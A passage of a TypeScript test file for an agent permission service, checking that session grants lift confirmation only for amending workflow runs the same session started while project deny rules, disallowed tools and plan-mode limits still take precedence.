      ruleId: "rule.disallowedTools",
    });
  });

  it("still yields to a project deny rule", () => {
    const service = new PermissionService();
    service.grantSessionPermission(sessionGrant);

    expect(
      service.checkPermission(
        {
          input: { script: "return 2;" },
          mode: "yolo",
          riskLevel: "low",
          toolName: "CreateWorkflow",
        },
        alwaysAskCapability,
        { deny: [{ toolName: "CreateWorkflow" }], version: 1 },
      ),
    ).toMatchObject({ decision: "deny", ruleId: "rule.project.deny" });
  });

  // 会话规则只服务 alwaysAsk gate：plan 模式下的只读约束不能被一条会话规则绕开。
  it("leaves tools without the alwaysAsk flag on their mode semantics", () => {
    const service = new PermissionService();
    service.grantSessionPermission([
      { behavior: "allow", rules: [{ toolName: "Write" }], type: "addRules" },
    ]);

    expect(
      service.checkPermission(
        { input: { file_path: "/w/a.ts" }, mode: "plan", riskLevel: "medium", toolName: "Write" },
        writeCapability,
      ).decision,
    ).not.toBe("allow");
  });
});

// ── 本会话 run 的修订免确认（docs/dynamic-workflow/launch.md「Amending this session's runs」）──
// 钥匙是 resolveInput 回填的 `predecessor`（journal 的 parent_session_id / stopReason），不是内存表：
// 本会话发起且非用户停下 → 放行；别的会话的 run、用户停过的 run、事实块缺席、其他工具都照常 ask；
// 阻断分支仍优先。没有可播种、可撤销的状态，所以新实例上同样成立。

describe("PermissionService workflow owner rule", () => {
  const owned = {
    run_id: "dwfrun-a",
    script: "return 3;",
    predecessor: { status: "running", owned_by_this_session: true },
  };

  function checkAmend(
    service: PermissionService,
    input: Record<string, unknown>,
    mode: PermissionContext["mode"] = "build",
    toolName = "AmendWorkflow",
  ) {
    return service.checkPermission(
      { input, mode, riskLevel: "low", toolName },
      alwaysAskCapability,
    );
  }

  for (const mode of ["yolo", "plan", "build", "edit", "default"] as const) {
    it(`lifts the gate in ${mode} mode for an amend of a run this session started`, () => {
      expect(checkAmend(new PermissionService(), owned, mode)).toMatchObject({
        allowed: true,
        decision: "allow",
        ruleId: "rule.session.workflowOwner",
      });
    });
  }

  it("keeps asking for another session's run, a user-stopped run, and a missing fact block", () => {
    const service = new PermissionService();
    expect(
      checkAmend(service, {
        ...owned,
        predecessor: { status: "completed", owned_by_this_session: false },
      }),
    ).toMatchObject({ decision: "ask", ruleId: "tool.alwaysAsk" });
    expect(
      checkAmend(service, {
        ...owned,
        predecessor: { status: "stopped", stop_reason: "user", owned_by_this_session: true },
      }),
    ).toMatchObject({ decision: "ask", ruleId: "tool.alwaysAsk" });
    expect(checkAmend(service, { run_id: "dwfrun-a", script: "return 3;" })).toMatchObject({
      decision: "ask",
      ruleId: "tool.alwaysAsk",
    });
  });

  it("allows an own run the model stopped, or that settled on its own", () => {
    const service = new PermissionService();
    for (const stop_reason of ["model", "provider", "interrupted", "superseded"] as const) {
      expect(
        checkAmend(service, {
          ...owned,
          predecessor: { status: "stopped", stop_reason, owned_by_this_session: true },
        }).decision,
      ).toBe("allow");
    }
    expect(
      checkAmend(service, {
        ...owned,
        predecessor: { status: "completed", owned_by_this_session: true },
      }).decision,
    ).toBe("allow");
  });

  it("is scoped to AmendWorkflow", () => {
    const service = new PermissionService();
    expect(checkAmend(service, owned, "build", "CreateWorkflow")).toMatchObject({
      decision: "ask",
      ruleId: "tool.alwaysAsk",
    });
    expect(checkAmend(service, owned, "build", "SaveWorkflow")).toMatchObject({
      decision: "ask",
      ruleId: "tool.alwaysAsk",
    });
  });

  it("still yields to an explicitly disallowed tool and to a project deny rule", () => {
    const disallowed = new PermissionService({
      allowedTools: new Set(),
      allowMediumRiskInAutoMode: false,
      autoApproveHighRisk: false,
      disallowedTools: new Set(["AmendWorkflow"]),
    });
    expect(checkAmend(disallowed, owned, "yolo")).toMatchObject({
      decision: "deny",
      ruleId: "rule.disallowedTools",
    });

    const denied = new PermissionService();
    expect(
      denied.checkPermission(
        { input: owned, mode: "yolo", riskLevel: "low", toolName: "AmendWorkflow" },
        alwaysAskCapability,
        { deny: [{ toolName: "AmendWorkflow" }], version: 1 },
      ),
    ).toMatchObject({ decision: "deny", ruleId: "rule.project.deny" });
  });
});
